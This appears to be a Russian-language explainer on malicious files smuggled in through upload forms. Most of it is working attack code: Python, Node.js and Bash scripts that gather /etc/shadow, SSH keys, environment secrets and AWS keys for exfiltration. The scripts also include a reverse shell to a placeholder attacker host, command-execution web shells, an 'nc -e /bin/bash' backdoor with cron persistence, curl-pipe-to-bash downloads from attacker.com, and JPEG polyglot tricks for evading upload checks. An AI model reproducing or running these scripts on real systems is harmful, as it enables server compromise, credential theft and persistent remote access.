
## 🚨 Малициозные скрипты при атаке через загрузку файлов

**Малициозные скрипты** — это исполняемые файлы, которые злоумышленник загружает на сервер, маскируя их под легитимные файлы (часто под изображения), чтобы выполнить произвольный код на сервере.

---

## 🐍 Пример малициозного Python скрипта:

```python
#!/usr/bin/env python3
# evil_server.py - маскируется под "avatar.py"

import os
import subprocess
import socket
import http.server
import socketserver

# 1. Кража конфиденциальных данных
def steal_data():
    # Чтение конфигов БД, env переменных, SSH ключей
    sensitive_files = [
        '/etc/passwd', '/etc/shadow', 
        '/app/.env', '/root/.ssh/id_rsa',
        '/var/www/html/config.php'
    ]
    
    stolen_data = ""
    for file_path in sensitive_files:
        try:
            with open(file_path, 'r') as f:
                stolen_data += f"=== {file_path} ===\n{f.read()}\n\n"
        except:
            pass
    
    # Отправка данных атакующему
    with open('/tmp/stolen_data.txt', 'w') as f:
        f.write(stolen_data)
    
    # Или отправка по сети
    # requests.post('http://attacker.com/steal', data=stolen_data)

# 2. Обратный шелл
def reverse_shell():
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("attacker-ip",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])

# 3. Бэкдор через HTTP сервер
class BackdoorHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/cmd':
            # Выполнение команд через URL параметры
            cmd = self.path.split('?cmd=')[1] if '?cmd=' in self.path else 'whoami'
            result = subprocess.getoutput(cmd)
            self.wfile.write(result.encode())
        else:
            super().do_GET()

def start_backdoor():
    with socketserver.TCPServer(("", 8888), BackdoorHandler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    steal_data()
    # reverse_shell()  # Раскомментировать для обратного шелла
    # start_backdoor() # Раскомментировать для бэкдора
```

##### Как маскируется под изображение:
```bash
# Добавление JPEG заголовка к Python скрипту
echo -e '\xff\xd8\xff\xe0' > fake_avatar.jpg.py
cat evil_server.py >> fake_avatar.jpg.py

# Файл будет определяться как:
# - По расширению: .jpg (обманывает фронтенд)
# - По magic numbers: JPEG (обманывает MIME проверку)  
# - По содержимому: Python код (выполняется при запуске)
```

---

## 📜Пример малициозного Node.js скрипта:

``` js
// evil_avatar.js - маскируется под "user_avatar.js"

const fs = require('fs');
const child_process = require('child_process');
const http = require('http');
const https = require('https');

// 1. Кража environment variables и конфигов
const stealEnvAndConfigs = () => {
    const secrets = {
        environment: process.env,
        database_config: {
            host: process.env.DB_HOST,
            user: process.env.DB_USER,
            password: process.env.DB_PASSWORD
        },
        aws_keys: {
            accessKeyId: process.env.AWS_ACCESS_KEY_ID,
            secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY
        }
    };

    // Сохранение для последующего извлечения
    fs.writeFileSync('/tmp/app_secrets.json', JSON.stringify(secrets, null, 2));
    
    // Или немедленная отправка
    // fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(secrets) });
};

// 2. Web shell для выполнения команд
const startWebShell = () => {
    const server = http.createServer((req, res) => {
        const url = new URL(req.url, `http://${req.headers.host}`);
        
        if (url.pathname === '/exec' && url.searchParams.has('cmd')) {
            const cmd = url.searchParams.get('cmd');
            child_process.exec(cmd, (error, stdout, stderr) => {
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end(stdout || stderr || error?.message);
            });
        } else {
            res.writeHead(404);
            res.end('Not Found');
        }
    });
    
    server.listen(3000, '0.0.0.0', () => {
        console.log('Web shell listening on port 3000');
    });
};

// 3. Сканирование внутренней сети
const scanInternalNetwork = () => {
    const ports = [22, 80, 443, 3306, 5432, 6379, 27017];
    const subnet = '192.168.1';
    
    ports.forEach(port => {
        for (let i = 1; i < 255; i++) {
            const host = `${subnet}.${i}`;
            const socket = require('net').Socket();
            socket.setTimeout(1000);
            
            socket.connect(port, host, () => {
                console.log(`OPEN: ${host}:${port}`);
                fs.appendFileSync('/tmp/network_scan.txt', `${host}:${port}\n`);
                socket.destroy();
            });
            
            socket.on('error', () => socket.destroy());
        }
    });
};

// Запуск всех функций
stealEnvAndConfigs();
// startWebShell();
// scanInternalNetwork();
```

##### Как маскируется под изображение:
```js
// Маскировка под JSON данные
{"image_data": "/* Малициозный Node.js код */\nconst fs=require('fs');fs.writeFileSync('/tmp/hacked','pwned');"}
```

---

## ⚡ Пример малициозного Bash скрипта:

```bash
#!/bin/bash
# evil_script.sh - маскируется под "profile_picture.sh"

# 1. Кража SSH ключей и конфигов
STEAL_DIR="/tmp/steal_$(date +%s)"
mkdir -p $STEAL_DIR

# Копирование SSH ключей
cp ~/.ssh/* $STEAL_DIR/ 2>/dev/null

# Копирование конфигов приложения
find /var/www /opt/app -name "*.env" -o -name "config.*" 2>/dev/null | xargs -I {} cp {} $STEAL_DIR/ 2>/dev/null

# Копирование файлов с паролями
find /etc -name "*pass*" -o -name "*shadow*" 2>/dev/null | xargs -I {} cp {} $STEAL_DIR/ 2>/dev/null

# Архивирование и отправка
tar -czf $STEAL_DIR.tar.gz $STEAL_DIR

# 2. Установка персистентного бэкдора
echo '#!/bin/bash
while true; do
    echo "listening for commands..."
    nc -l -p 4444 -e /bin/bash 2>/dev/null
    sleep 10
done' > /etc/backdoor.sh

chmod +x /etc/backdoor.sh
nohup /etc/backdoor.sh > /dev/null 2>&1 &

# 3. Добавление cron job для персистентности
(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://attacker.com/checkin") | crontab -

# 4. Эскалация привилегий через уязвимые SUID бинарцы
find / -perm -4000 -type f 2>/dev/null > $STEAL_DIR/suid_binaries.txt

# 5. Сокрытие следов - маскировка под системный скрипт
mv $0 /etc/cron.hourly/cleanup_tmp
chmod 755 /etc/cron.hourly/cleanup_tmp

echo "Script execution completed"
```

##### Маскировка под изображение через polyglot:

```bash
# Создание polyglot JPEG/Bash файла
echo -e '#!/bin/bash\necho "pwned" > /tmp/hacked\n\0' > payload.sh
echo -e '\xff\xd8\xff\xe0' > fake_image.jpg.sh
cat payload.sh >> fake_image.jpg.sh

# Файл будет интерпретироваться как:
# - JPEG для MIME проверок (первые байты)
# - Bash скрипт для выполнения
```

---

## 🎭 **Техники обхода проверок**

### 1. **Polyglot файлы** (многоформатные):

```python
# JPEG + Python polyglot
jpeg_header = b'\xff\xd8\xff\xe0'
python_code = b'''
#!/usr/bin/env python3
import os
os.system("curl http://attacker.com/shell.sh | bash")
'''

with open('polyglot.jpg.py', 'wb') as f:
    f.write(jpeg_header + python_code)
```

### 2. **Подмена расширений**:

```bash
# Опасные расширения, маскирующиеся под безопасные
evil_script.png.php
avatar.jpg.exe
document.pdf.sh
```

### 3. **Unicode-обфускация**:

```js
// Использование Unicode символов для обфускации
// avatar.ρ⍺ꮛꭲ.js (выглядит как .png)
const fs = require('fs');
fs.writeFileSync('/tmp/hacked', 'pwned');
```